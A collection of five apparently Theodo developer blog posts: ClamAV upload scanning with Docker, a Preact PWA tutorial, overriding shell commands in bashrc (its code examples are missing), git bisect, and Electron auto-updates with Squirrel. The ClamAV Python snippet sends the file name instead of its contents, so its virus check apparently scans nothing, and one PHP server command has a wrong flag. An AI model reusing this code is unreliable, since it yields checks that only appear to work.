{"article": "\r\n\t\t\t\t\t\t\t\t\t\tI recently had to allow customers to upload files on a website, then send their content to an external API.\nWe had a few requirements for the files to be valid and one of them was to ensure they were checked for any virus before posting their content to the API.\nOur infrastructure\nOur stack was a React frontend and a Django Backend, hosted on AWS Elastic Beanstalk.\nThe backend was mainly designed as a proxy for all the requests that the frontend wanted to make with the external API, which means we would not be storing any of the files uploaded by the customer. We only needed to analyse the stream of the files.\n\nWe also needed to be sure that the solution would work for our development environment alongside our validation and our production platforms.\nThe go-to solution was to use Docker Images.\nNot only could we have a quick installation for our local environments but we could use the EBS Docker configuration to setup our instances easily.\nIn terms of AntiVirus, ClamAV revealed itself as the only one we could use easily and for free.\nWe then chose 2 Docker images:\n\nOne to run the Clamd daemon and the freshclam tool (to update the virus database) as a recurring job. (https://github.com/mko-x/docker-clamav)\nOne to connect to the network socket of the daemon and expose a rest API we could easily use. (https://github.com/solita/clamav-rest)\n\n\nConfiguration\nOur docker-compose.yml file looked like this for our local environment:\nversion: '2'\r\n\r\nservices:\r\n  clamav-server:\r\n    image: mkodockx/docker-clamav\r\n  clamav-rest:\r\n    image: lokori/clamav-rest\r\n    links:\r\n      - clamav-server\r\n    environment:\r\n      CLAMD_HOST: clamav-server\r\n  backend:\r\n    build: .\r\n    command: python /code/manage.py runserver\r\n    volumes:\r\n      - .:/code\r\n    ports:\r\n      - \"8000:8000\"\r\n    links:\r\n      - clamav-rest\r\n\nNote: these images did not need any open ports because they would be called directly from your backend instance. However, the REST image needed to have the ClamaAV server as a link and the backend needed to have access to the REST!\nWe could replicate the same configuration as a multi-container docker configuration within AWS EBS.\nHere is our Dockerrun.aws.json:\n{\r\n  \"AWSEBDockerrunVersion\": 2,\r\n  \"containerDefinitions\": [\r\n    {\r\n      \"name\": \"clamav-server\",\r\n      \"image\": \"mkodockx/docker-clamav\",\r\n      \"essential\": true,\r\n      \"memory\": 1024\r\n    },\r\n    {\r\n      \"name\": \"clamav-rest\",\r\n      \"image\": \"lokori/clamav-rest\",\r\n      \"essential\": true,\r\n      \"memory\": 512,\r\n      \"links\": [\r\n        \"clamav-server:clamav-server\"\r\n      ],\r\n      \"portMappings\": [\r\n        {\r\n          \"hostPort\": 8080,\r\n          \"containerPort\": 8080\r\n        }\r\n      ],\r\n      \"environment\" : [\r\n          { \"name\" : \"CLAMD_HOST\", \"value\" : \"clamav-server\" }\r\n      ]\r\n    }\r\n  ]\r\n}\r\n\nNote: we went for a t2.small for the instance because the daemon and freshclam used a lot of memory when updating. (below 1GB caused us problems)\nMake it rain!\nThen we could use our instance with its private IP to post files on the port 8080!\n\nIn python, we could analyse the file sent from the frontend:\nfiles = {'file': file.name}\r\ndata = {'name': file.name}\r\nresponse = requests.post('http://%s:8080/scan' % settings.CLAMAV_HOST, files=files, data=data)\r\n\r\nif not 'Everything ok : true' in response.text:\r\n    logger.info('File %s is dangerous, preventing upload' % file.name)\r\n    raise UploadValidationException('Virus found in the file')\r\n\nNote: the rest API is returning \u2018Everything ok : true\u2019 with what seems to be a new line at the end of the string.\nCLAMAV_HOST was our instance private IP on our staging and production platform, it was \u2018clamav-rest\u2019 locally.\nConclusion\nIt took us a few days to investigate all the possible solutions and come up with this configuration.\nThis not only allows you to have a fast solution but also a reliable one thanks to ElasticBeanstalk.\nI hope it will help anyone who needs to have a quick implementation of an antivirus \n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tCl\u00e9ment Pasteau\r\n  \t\t\t\r\n  \t\t\t\tAgile Web Engineer at Theodo UK  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tThis article will introduce you to the world of Progressive Web Apps, to the Preact framework and to Web APIs. It will guide you through 15 minutes of code to create your first Preact Progressive Web App!\nStatus of PWAs today\nProgressive Web Apps are taking over the web! They are the future of desktop, mobile and native web applications. Multiple major companies are switching to PWAs for costs but also performance reasons:\u00a0Twitter, Uber, l\u2019\u00c9quipe\u2026\nBut first, what is a Progressive Web App (PWA) ?\u00a0A Progressive Web Application is a combination of the latest web technologies and good practices to implement. Most of the latter can be evaluated by the Lighthouse Chrome extension. And its extensive documentation will teach you a lot on how to improve you app.\nThose practices will make your web application:\u00a0Progressive, Responsive, Connectivity independent, App-like, Fresh, Safe, Discoverable, Re-engageable, Installable and Linkable. You can find a definition of each of those characteristics at Google\u2019s. The combination of those characteristics result in one single web application that is lighter, faster to load, usable on any device, on low-quality networks and even offline. You can use the web framework of your choice and your app will be cross-platform and cross-devices. The most common frameworks for PWAs today are Angular, React, Vue.js and Ionic.\n\nPWAs still suffer from a few limitations compared to native apps due to them being brand new. However, more and more Web APIs are announced at Google I/Os each year and Apple is now considering integrating one of the technologies that make up PWAs: the service workers.\nFinally, even if you\u2019re not aiming at replacing your native apps by a PWAs (yet!), implementing those good practices in your mobile and desktop web applications will help you drastically improve performances and maybe even positively impact your business. You can trust Algolia about its performance improvement and Google in its showcase for business impact.\nThis article is the first of a series that will show you how to create a new PWA from scratch using the Preact framework. Our final application will be a social media PWA where we can post photos that will be pinned on a map. The tutorial demonstrates how to use React packages in the Preact framework, and how easy it can be to use Web APIs in your PWA. The next parts in the series will teach you how to:\n\nConnect your app to Firebase using ReactFire\nUse the Geolocation Web API\nAdd Google Authentication\nSet up the offline mode in your PWA\nImprove the performances\nUse push notifications\n\u2026\n\nWe also started writing a series of awesome articles on how to build a PWA using Vue.js, Webpack, Material Design and Firebase:\u00a0Part 1, Part 2 and Part 3.\nWhy Preact?\n\nPreact is a tiny 3KB alternative to React, meaning it is super light and fast, and it packs up most of React\u2019s features, including the same API! You can check this article for a quick comparison and an example of how to switch from React to Preact. Preact aims to offer high performance rendering with an optional compatibility layer (preact-compat) that integrates well with the rest of the React ecosystem such as Redux.\nPreact is thus perfectly suited for desktop and more specifically mobile web-apps used with poor data connection, and therefore for Progressive Web Apps. Multiple renowned companies are now using Preact in production, such as Uber, Housing.com and Lyft. You can have a more exhaustive list of them here.\u00a0Addy Osmani did a quick review of the performances of the Treebo PWA and wrote:\u00a0\u201cSwitching from React to Preact was responsible for a 15% improvement in time-to-interactive alone\u201d. Preact helped them \u201cgetting their vendor bundle-size and JS execution time down\u201d.\nOur goals in this article\nBy the end of this article, after 15 minutes of coding, we will have:\n\nA Progressive Web App based on Preact and webpack, scaffolded by preact-cli\nA map displayed by the google-maps-react React package (Google Maps API)\nA camera button (Material Design Lite)\nA camera modal triggered by the camera button (Camera Web API)\nThe picture taken by the camera/webcam displayed on the map\n\n\nLet\u2019s code!\nYou can find the companion repository for this article here. I will also post the matching commits links along the article steps. However, I won\u2019t linger on some commits related to code style and documentation. We will use yarn instead of npm in the examples. To install it you can refer to this page.\nI wrote this article using the following versions:\n\nnode v8.1.2\npreact v2.0.2\nyarn v1.0.1\n\nScaffold your app\nTo begin, we need to install preact-cli and create our project:\nyarn add preact-cli\r\npreact create default pinpic\r\ncd pinpic\r\nyarn install\r\nyarn dev\r\n\n\nAll this constitues our first commit. The project creation is pretty straightforward and won\u2019t ask you anything other than the project name. After running yarn dev, you can now follow the link given to check the results of your developments in real-time on http://localhost:8080.\nCheck out the hot reload on your phone!\nHowever the best way to visualize your new Preact Progressive Web App is still on your mobile device. If your phone is on the same network, you can use the address shown by the yarn dev command, http://192.168.1.100:8080 in our example above. Of course, you can also show off and share your PWA to your friends. For this purpose, I recommend you use ngrok.\u00a0ngrok will expose your local environment and you will be able to access it on your phone. You can have a more thorough review of ngrok in Matthieu Auger\u2019s article.\nInstall it and run it:\nyarn global add ngrok\r\nngrok http 8080\r\n\nThe output should look like:\n\nBrowse on your phone to either link and you will be able to access your PWA.\nIt is now time for a bit of cleaning by removing some generated documentation and files (commit) and adding a Webpack alias to make PinPic refer to the src files (commit).\nUpdate the manifest\nWe can now modify our src/manifest.json to update the name of our PWA (see this commit). The manifest.json is what makes a PWA installable and handles its display (if it\u2019s seen like a normal web page in chrome, or in a standalone app). By default preact-cli makes our PWA standalone and makes it feel like a native app.\n\nDisplay a map\nTo display a map in our app we will use the library google-maps-react. We will start by adding the package:\nyarn add google-maps-react\r\n\nYou can now get a Google API key from the Google Developers website and put it in src/service/api.js:\nexport const GOOGLE_API_KEY = '<YOUR-GOOGLE-API-KEY>';\r\n\nOur next step is to create a component in src/components/maps/index.js and add in it the lines of code from this section of the google-maps-react documentation. We also need to add the GOOGLE_API_KEY to our component (as specified in this section). In your src/components/maps/index.js, import the API key into a GoogleApiWrapper and import this new component into our src/components/app.js:\n...\r\nimport { GOOGLE_API_KEY } from 'PinPic/service/api';\r\n...\r\nexport default GoogleApiWrapper({\r\n    apiKey: GOOGLE_API_KEY,\r\n})(MapContainer)\r\n\n...\r\nimport MapContainer from './maps';\r\n...\r\n    render() {\r\n        return (\r\n            <div id=\"app\">\r\n                ...\r\n                <MapContainer />\r\n            </div>\r\n        );\r\n    }\r\n...\r\n\nYour changes should look like this commit. Finally, we can fiddle around with the style (commit) to have the whole map displayed and not hidden by the header. Your app should now perfectly display a map as background of your app. Congratulations!\n\nMaterial Design Lite and React Camera\nOur goal is now to use the camera/webcam of your mobile/laptop and to access it by tapping a Material Design camera button. To do that, we now need to install two new packages:\nyarn add preact-mdl\r\nyarn add react-camera\r\n\nAdd the Camera Button\nLet\u2019s first add the Material Design Camera button centered at the bottom of our app. From the preact-mdl package documentation we get the two links to the stylesheets. We can then import the button and icon we want along with the Material Design stylesheets. We also add some style to have it centered at the bottom of our page. In our src/components/app.js, add (commit):\n...\r\nimport { Button, Icon } from 'preact-mdl'\r\n...\r\n                <div className=\"buttonContainer\">\r\n                    <Button\r\n                        fab\r\n                        colored\r\n                        raised\r\n                        onClick={this.toggleCameraModal}\r\n                    >\r\n                        <Icon icon=\"camera\"/>\r\n                    </Button>\r\n                </div>\r\n                <link rel=\"stylesheet\" href=\"https://fonts.googleapis.com/icon?family=Material+Icons\" />\r\n                <link rel=\"stylesheet\" href=\"https://code.getmdl.io/1.2.1/material.indigo-pink.min.css\" />\r\n...\r\n...\r\n.buttonContainer {\r\n    position: absolute;\r\n    bottom: 0;\r\n    padding: 10px;\r\n    display: flex;\r\n    align-items: center;\r\n    width: 100%;\r\n}\r\n\n\nCreate and display the Camera Modal\nOur app now needs a modal to display the media stream from our webcam/camera. This modal will be our new component src/components/cameraModal/index.js, created from the content of this section of the react-camera documentation. Copy it and replace import React, { Component } from 'react'; by import { Component } from 'preact'; and App by CameraModal (commit). We can then import it in src/components/app.js.\n...\r\nimport CameraModal from './cameraModal';\r\n...\r\n    render() {\r\n        return (\r\n            ...\r\n            <CameraModal />\r\n            ...\r\n        )\r\n    }\r\n\nYou can now see the CameraModal open at any time.\n\nMake the Camera Button toggle the Modal\nOn our app, we now have a CameraButton that does nothing and a CameraModal that displays the video stream from our webcam/camera. The next step is to have the CameraButton toggle on and off the CameraModal. In src/components/app.js, we create a state property isCameraModalOpen set to false by default and a function toggleCameraModal that will toggle this state. Those two are to be passed to the CameraModal component. Now, in src/components/cameraModal/index.js, we handle those two new props and create a hideModal() method to manage the style of the modal (commit).\n...\r\nexport default class App extends Component {\r\n    constructor(props) {\r\n        super(props);\r\n        this.setState({\r\n            isCameraModalOpen: false,\r\n        })\r\n        this.toggleCameraModal = this.toggleCameraModal.bind(this);\r\n        this.setPicture = this.setPicture.bind(this);\r\n    }\r\n\r\n    toggleCameraModal() {\r\n        const isCameraModalOpen = this.state.isCameraModalOpen;\r\n        this.setState({\r\n            isCameraModalOpen: !isCameraModalOpen\r\n        });\r\n    }\r\n    ...\r\n    render() {\r\n        return (\r\n            ...\r\n            <CameraModal\r\n                isModalOpen={this.state.isCameraModalOpen}\r\n                toggleCameraModal={this.toggleCameraModal}\r\n            />\r\n        )\r\n    }\r\n    ...\r\n}\r\n\n...\r\nexport default class CameraModal extends Component {\r\n    constructor(props) {\r\n        ...\r\n        this.hideModal = this.hideModal.bind(this);\r\n    }\r\n    ...\r\n    hideModal() {\r\n        return this.props.isModalOpen ? {top: 0, opacity: 1} : {top: '100vh', opacity: 0}\r\n    }\r\n    ...\r\n    render() {\r\n        return (\r\n            <div\r\n                style={{\r\n                    ...style.container,\r\n                    ...this.hideModal()\r\n                }}\r\n            >\r\n                ...\r\n            </div>\r\n        )\r\n    }\r\n    ...\r\n}\r\n\nYour button now toggles the CameraModal on and off. I added some style to have a smoother toggle (commit) and added prop-types checks on the CameraModal (commit). I ended with a bit of code cleaning by moving the style of the components inline (commit).\nDisplay Taken Picture\nThe last step of our app is now to save and display the picture taken. In src/components/app.js, we create a method setPicture that will save the picture blob in an objectURL. We then pass this method to the CameraModal.\nWe also display the picture on the top right of the map (commit).\nNow use this method in src/components/cameraModal/index.js:\n...\r\nexport default class App extends Component {\r\n    constructor(props) {\r\n        ...\r\n        this.setPicture = this.setPicture.bind(this);\r\n    }\r\n    ...\r\n    setPicture(picture) {\r\n        this.img.src = URL.createObjectURL(picture);\r\n    }\r\n    ...\r\n    render() {\r\n        return (\r\n            <div style={styles.app}>\r\n            ...\r\n                <div style={styles.mapContainer}>\r\n                    <img\r\n                        style={styles.picture}\r\n                        ref={(img) => {\r\n                            this.img = img;\r\n                        }}\r\n                    />\r\n                    ...\r\n                </div>\r\n                <CameraModal\r\n                    ...\r\n                    setPicture={this.setPicture}\r\n                />\r\n            </div>\r\n            ...\r\n        )\r\n    }\r\n}\r\n\r\nconst styles = {\r\n    ...\r\n    picture: {\r\n        top: 10,\r\n        right: 10,\r\n        position: 'absolute',\r\n        zIndex: 10,\r\n        height: 200,\r\n    },\r\n    ...\r\n}\r\n\r\n\n...\r\nexport default class CameraModal extends Component {\r\n    ...\r\n    static propTypes = {\r\n        ...\r\n        setPicture: PropTypes.func,\r\n    }\r\n    ...\r\n    takePicture() {\r\n        ...\r\n        .then(blob => {\r\n            this.props.setPicture(blob)\r\n        });\r\n        ...\r\n    }\r\n}\r\n\nYou can also remove the following lines of code from src/components/cameraModal/index.js, since it has been moved to src/components/app.js:\n...\r\n<img\r\n    style={style.captureImage}\r\n    ref={(img) => {\r\n        this.img = img;\r\n    }}\r\n>\r\n...\r\n\n\nAwesome! You now have your own Preact Progressive Web App that displays a map and its pinpoints, allows you to take a picture through the webcam/camera of your device and displays it.\nConclusions\nThis tutorial allowed us to discover preact and to see how quick it can be used to develop a small but powerful PWA from scratch.\n\nWe created a Preact and webpack based Progressive Web App backbone using one command\nWe used the Google Maps API to display a map as background of our app\nWe added a Material Design camera button\nWe used the Camera Web API to take a picture and display it\n\nIf you are in Paris and interested in PWAs, I am co-organizing the Paris Progressive Web Apps Meetup once every month. Don\u2019t hesitate and join us!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tLaurent Ros\r\n  \t\t\t\r\n  \t\t\t\t@lros_8 \u2022 Lean Full Stack Developer @Theodo \u2022 @PwaParis Meetup Organizer \u2022 Climbing addict!  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tOne week ago, our production server was down for a few seconds because the command supervisorctl reload had restarted the server. \nThus, I made some research to prevent the command to be run again with the reload option.\nThe first clue Stack Overflow gave me, was to create a new binary file with the name of this command and to change my path variable to override the native one. This has side effects: your binary files can be used by other scripts that you don\u2019t know of, or worse, you can introduce security breaches by change the the user\u2019s rights of your binary file \u2026 Moreover, this solution let you only override the whole command.\nFinally, aliases saved my life (or at least, my server\u2019s life).\nTo override a command, in your .bashrc file, create a function with the exact same name. For instance if you want to make fun of one of your colleagues, you can do: \n\nMore seriously, you can test the argument given to your command and specify different behaviours: and override the option(s) you want to:\n\nIf your command works with flags, you should use getopts, which have a nicer syntax.\nWith this trick you can prevent users to run --force, --rf and some other dangerous options on your production servers. But remember, as the joke shows, it\u2019s just a safeguard, not a real security.\nPlease feel free to share your tips as well!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tAurore Malherbes\r\n  \t\t\t\r\n  \t\t\t\tWeb Developer at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tOver my last working year, I have worked on two big projects, both more than 18 months old with several scrum teams working on it. And both facing a few regressions in production each week.\nAlthough I knew it existed and how it worked, I was not aware of the utility of git bisect and had never used it until a few weeks ago. Following a recommendation from the lead developer of my project, I started to use it to solve the regressions we were facing. And I feel like it may be the best way to do it.\nWhy ?\nYou will have the lines of code which introduced the regression in less than 10 minutes. Git bisect allows you to go through 1000 commits in 10 iterations; as an indication, in my current 3-4 developers team, 1000 commits represent about 3 months of work.\nMoreover, you will be able to find the dev who introduced the code. If you can reach them:\n\nYou will easily have the context of why this buggy code was introduced, pointing out what you should be careful not to break while solving the bug\nYou will help them progress. Finding out that some code you wrote was buggy because of this precise side effect, and that this was the best way to do it, is a very efficient way to get better.\nMost of all, you will be able to identify what information they lacked not to do this mistake, and thus which action to take to prevent similar regressions from happening.\n\nHaving the code and the context will help you a lot to find a solution to fix the bug.\nHow ?\nThe idea is really simple. Starting from two commits, one where the feature worked, and a more recent one with the feature broken, git bisect will perform a dichotomy to find the commit introducing the regression.\nIn practice, check out the current version of your code and start bisecting:\ngit bisect start\r\n\nSince the feature is currently broken, inform git that this version contains the buggy commit:\ngit bisect bad\r\n\nYou will now need to find a state where the feature worked. It may be an older reliable release, or you may as well just go through your history to find a maybe one or two months old commit with the feature working.\nOnce you found it, mark this version as reliable:\ngit bisect good v2.1.13\r\n\nOr:\ngit bisect good e627db2fc0a8ff1da6a67b5482c3f56dbedfaba1\r\n\nThe bisection will now actually start. Git checks out the commit in the middle of these two commits and you simply need to build your code and check whether the feature works or not. Indicate the result with git bisect good or git bisect bad and iterate. After a few iterations (git prompts you the number of required iterations after each step), you will have your faulty commit!\nFor more details on the options of the git bisect command, refer to the official git documentation\nNB: This is one more reason for making usable (i.e. with the application build working) and unitary commits. Without it, git bisect will be either harder to use or less useful, since finding out the faulty lines in a big commit might not be easy.\nMy personal story\nTo illustrate my point, let me give you an example where the git bisection helped me. The regression I had to solve was a 15 pixels margin missing under the images and title of a given page:\n\nA naive solution could have been to simply add a margin-bottom to the div containing those pictures. The regression would be solved, but we would have no idea of what caused it, and if it (or a similar one) would happen again.\nUsing git bisect, I found out that it was introduced about a month earlier. The margin-bottom still existed, but the property display: inline-block; had been removed from the <a> tag under the image, and thus the margin no longer applied. The css class applied to this tag being shared in the entire website, it was clear to me that the developer had changed it to improve another page design but forgot to check if it broke something on the images page. I could therefore move the margin-bottom from the <a> tag, where it was no longer needed, to the div containing the image and the text.\nYet, I checked with him, and it appeared that my hypothesis was completely wrong. He did check the broken page, but since a missing margin does not catch the eye, he didn\u2019t notice the regression. The fix was still valid, but we learnt something else from this talk: to properly test the design of a page, one should compare the design before and the design after, to make sure that the changes only affect the desired parts.\nAs illustrated by this example, git bisect will allow you to quickly find the fix to the regressions you may be facing. But what makes it truly valuable is that it will also give you the root causes of these regressions, helping you to find the right actions to make sure that they won\u2019t happen again.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tNicolas Miret\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tIf you are a web developer, you would be amazed by the possibilities that a desktop application offers.\nJust give a look at the applications listed on electron website to have a quick glance of the infinite opportunities offered by such a technology.\nFew key features:\n\nAccess to the filesystem (see Atom)\nAccess to the webcam and mike (see Dischord)\nAccess to the command line interface within your app (see Hyper)\n\nThe problem is: How can you keep your speed and ease of reaching your users when you develop a desktop application ?\nMeet, Squirrel:\n\nThis little open-source framework aims to simplify installers for desktop softwares.\nWhen correctly set up, it enables your application to watch for new releases deployed on a server and to automatically update itself from the downloaded files.\nElectron auto-updater gives you an API to easily plug Squirrel to your application.\nThis sounds great, but when I recently tried to implement this feature for a Windows application, I had a hard time to understand how every pieces fit together.\nI will give you a quick glance of what I learned doing this, and explain how the update loop of a Squirrel application works.\nThe framework also works on Mac but the server implementation is slightly different:\nTo use Squirrel for Mac with Electron, check this article which helped me a lot when implementing the feature.\nPrepare your application to watch Squirrel\nOk to have a common base of code, let\u2019s say we will implement this feature on the Electron Quick Start and use it as an example.\nThis is a real minimal electron application and we will use only two files in it: Main.js and package.json.\nGit clone the repository and here we go.\nFirst thing to make your application listen to your Squirrel server, you\u2019ll need to use the electron.auto-updater API.\nAdd this script which is going to make your app watch for server updates.\nconst electron = require('electron');\r\nconst squirrelUrl = \"http://localhost:3333\";\r\n\r\nconst startAutoUpdater = (squirrelUrl) => {\r\n  // The Squirrel application will watch the provided URL\r\n  electron.autoUpdater.setFeedURL(`${squirrelUrl}/win64/`);\r\n\r\n  // Display a success message on successful update\r\n  electron.autoUpdater.addListener(\"update-downloaded\", (event, releaseNotes, releaseName) => {\r\n    electron.dialog.showMessageBox({\"message\": `The release ${releaseName} has been downloaded`});\r\n  });\r\n\r\n  // Display an error message on update error\r\n  electron.autoUpdater.addListener(\"error\", (error) => {\r\n    electron.dialog.showMessageBox({\"message\": \"Auto updater error: \" + error});\r\n  });\r\n\r\n  // tell squirrel to check for updates\r\n  electron.autoUpdater.checkForUpdates();\r\n}\r\n\r\napp.on('ready', function (){\r\n  // Add this condition to avoid error when running your application locally\r\n  if (process.env.NODE_ENV !== \"dev\") startAutoUpdater(squirrelUrl)\r\n});\r\n\nGreat, now your application will listen to the provided feedUrl. But as it is not wrapped yet into the Squirrel framework, you will have an error thrown when using it in dev mode.\nTo avoid this inconvenience, use the following command as your npm start in package.json:\nNODE_ENV=dev electron .\r\n\nWhen launched for the first time, Squirrel will need to restart or it will throw an error.\nTo handle this, add the following to your Main.js:\nconst handleSquirrelEvent = () => {\r\n  if (process.argv.length === 1) {\r\n    return false;\r\n  }\r\n\r\n  const squirrelEvent = process.argv[1];\r\n  switch (squirrelEvent) {\r\n    case '--squirrel-install':\r\n    case '--squirrel-updated':\r\n    case '--squirrel-uninstall':\r\n      setTimeout(app.quit, 1000);\r\n      return true;\r\n\r\n    case '--squirrel-obsolete':\r\n      app.quit();\r\n      return true;\r\n  }\r\n}\r\n\r\nif (handleSquirrelEvent()) {\r\n  // squirrel event handled and app will exit in 1000ms, so don't do anything else\r\n  return;\r\n}\r\n\nThis script will read the option of the squirrel event when launching your application, giving you the ability to execute scripts at specific moments of the installation.\nIn this case, it will restart the application when installing it, updating it or uninstalling it.\nYou can as well do thing like add an shortcut icon on desktop when installing the application and remove it when uninstalling (check this documentation).\nYour app is now ready to be packed \nLet\u2019s release our app!\nOkay you have your wonderful app ready to be released!\nWe now need to package it, using for example the electron-packager.\nInstall the package :\nnpm install electron-packager --save-dev\r\n\nAnd run this command to package your release :\n./node_modules/.bin/electron-packager . MyAwesomeApp --platform=win32 --arch=x64 --out=release/package\r\n\nInside release/package/MyAwesomeApp-win32-x64 folder, you now have a MyAwesomeApp.exe file that you can run on Windows! Here is your first release of your wonderful app.\nNow wrap it with Squirrel\nWe will now have to create a Windows installer for it that includes Squirrel.\nThe Electron team released lately the electron-winstaller package that does the job pretty well.\nInstall the package with:\nnpm install electron-winstaller --save-dev\r\n\nThen create a build.js script like this one:\nvar electronInstaller = require('electron-winstaller');\r\n\r\nresultPromise = electronInstaller.createWindowsInstaller({\r\n    appDirectory: './release/MyAwesomeApp-win32-x64',\r\n    outputDirectory: './release/installer',\r\n    authors: 'Me',\r\n    exe: 'MyAwesomeApp.exe'\r\n  });\r\n\r\nresultPromise.then(() => console.log(\"It worked!\"), (e) => console.log(`No dice: ${e.message}`));\r\n\nThis file will tell Squirrel all it needs to know to create you an installer:\n\nWhere your app release is located\nWhere to put the new release\nWhere the entrypoint of your app is\n\nExecute this script with node:\nnode ./build.js\r\n\nGo and check in release/installer, you now have a ready to use Squirrel server!\nIt should look like this:\ninstaller\r\n\u251c\u2500 RELEASES\r\n\u251c\u2500 MyAwesomeApp-0.0.1-full.nupkg\r\n\u2514\u2500 Setup.exe\r\n\nDistribute your application\nThe only thing you need now is to create a file server to serve this folder on internet. You can for example serve it with php:\nphp -s localhost:3333\r\n\nVery simply, you can now distribute your application to your users with the Setup.exe file.\nGo to http://localhost:3333/Setup.exe, this will download the Setup.exe file which will install MyAwesomeApp wrapped with Squirrel on your computer.\nRun the Setup.exe file, and the application should be installed in C:\\Users\\Me\\AppData\\MyAwesomeApp\\.\nTo run it, launch the MyAwesome.exe file.\nYou can as well create a shortcut on your desktop for later use.\nTime to build a new release\nLet\u2019s now try to build a new version of our app and to release it!\nFirst things first, let\u2019s create a new feature:\nalert('OMG such new feature!!');\r\n\nNow bump the version from package.json.\nThis is compulsory if you want to create a new package, otherwise the previous one will be overwritten:\nnpm version patch\r\n\nThe 0.0.2 version of our app is ready!\nRedo the process to build a new package.\nTo simplify this, we can write npm commands:\n\"scripts\": {\r\n  \"build:package\": \"electron-packager . MyAwesomeApp --platform=win32 --arch=x64 --out=release/package\",\r\n  \"build:winstaller\": \"node ./build.js\",\r\n  \"build\": \"npm run build:package && npm run build:winstaller\"\r\n}\r\n\nRun then:\nnpm run build\r\n\nCheck out the releases/installer, a new package appeared!\nYour Squirrel server should now looks like this:\ninstaller\r\n\u251c\u2500 RELEASES\r\n\u251c\u2500 MyAwesomeApp-0.0.1-full.nupkg\r\n\u251c\u2500 MyAwesomeApp-0.0.2-diff.nupkg\r\n\u251c\u2500 MyAwesomeApp-0.0.2-full.nupkg\r\n\u2514\u2500 Setup.exe\r\n\nWhen the magic happens\nOpen now your application: you can use the shortcut that you have created earlier or go to C:\\Users\\Me\\AppData\\MyAwesomeApp\\.\nWait for around 20sec, and your app should reload and you will see your new wonderful feature appears!\n\nWhat happened?\nLet\u2019s give a look at how the Squirrel app has been installed: the location should be C:\\Users\\Me\\AppData\\MyAwesomeApp\\, where Me is your Windows username.\nThe application is bundled as follows:\nMyAwesomeApp\r\n\u2502\r\n\u251c\u2500 app-0.0.1                // This contains the packaged electron application version 0.0.1\r\n\u2502  \u251c\u2500 MyAwesomeApp.exe\r\n|  \u251c\u2500 squirrel.exe\r\n|  ...\r\n\u2502  \u2514\u2500 resources\r\n\u2502     \u251c\u2500 app.asar           // This contains the source code of electron application version 0.0.1\r\n\u2502     \u2514\u2500 electron.asar\r\n\u2502\r\n\u251c\u2500 packages                 // This contains the packages downloaded from Squirrel server\r\n\u2502  \u251c\u2500 RELEASES\r\n\u2502  \u251c\u2500 MyAwesomeApp-0.0.1-full.nupkg  \r\n\u2502  ...\r\n\u2502\r\n\u251c\u2500 MyAwesomeApp.exe            // This will launch Update.exe and then the latest app installed\r\n\u251c\u2500 SquirrelSetup.log\r\n\u2514\u2500 Update.exe               // This is the Squirrel program used to Update application\r\n\nSo what\u2019s happening when you click on the shortcut?\n\nThe entry point is /MyAwesomeApp.exe.\nThis will launch the latest local version of the application (here 0.0.1).\nThe entry point of the application is main.js.\nIt contains the startAutoUpdater function we added earlier which configures the squirrel updater through the electron.autoupdater API.\nThis will call /Update.exe (which is the main Squirrel program) to check for new releases.\nUpdate.exe checks at the feedUrl set and download the remote RELEASES file.\nThen, it compares this downloaded file to the local /packages/RELEASES file.\nIf there is a new version, it downloads it and unpack it into an app-0.0.2 folder.\nThen the \u2018update-downloaded\u2019 event is triggered and the alert appears in MyAwesomeApp.\nWhen launching again the MyAwesomeApp, the previous version is cleansed and the application is updated.\n\nThe easy part\nTo set up continuous deployment, deploy a new release on your server and Squirrel will do the rest!\nYou now know pretty everything about the Squirrel.Windows framework!\nTo dive deeper into the possibilities that it offers, open a terminal on Windows and run ./Update.exe into your project folder to display available documentation.\nHope this helps, don\u2019t hesitate to give feedbacks!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tNicolas Ng\u00f4-Ma\u00ef\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    